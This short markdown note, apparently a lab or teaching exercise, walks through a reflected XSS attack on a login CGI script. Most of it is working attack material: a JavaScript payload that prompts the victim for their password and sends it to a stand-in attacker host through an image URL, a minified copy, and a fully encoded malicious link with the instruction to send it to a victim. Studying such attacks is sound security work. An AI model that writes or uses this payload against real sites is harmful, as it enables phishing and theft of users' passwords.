# XSS attack
Here is the script we would like to execute on the victim's machine

    var p = prompt("Please, enter your password again");
    o = document.createElement('img');
    o.setAttribute('src', 'http://www.evil-attacker-website.com/password=' + p);
    document.body.appendChild(o);

This code will prompt for the user's password, create an image with the password in the URL and append it to the body, making the browser send a request to our malicious server that will log the password.

## Minified version

    var p=prompt("Please, enter your password again");o=document.createElement('img');o.setAttribute('src','http://www.evil-attacker-website.com/password='+p);document.body.appendChild(o)

## URL to attack, only work in Firefox:
Send this URL to a victim to start the attack.
This not a permanent XSS attack.
> Replace "localhost" by the server name

http://localhost/cgi-bin/login.cgi?username=%3Cscript%3Evar%20p=prompt(%22Please,%20enter%20your%20password%20again%22);o=document.createElement(%27img%27);o.setAttribute(%27src%27,%27http://www.evil-attacker-website.com/password=%27+p);document.body.appendChild(o);%3C/script%3E&password=foobar
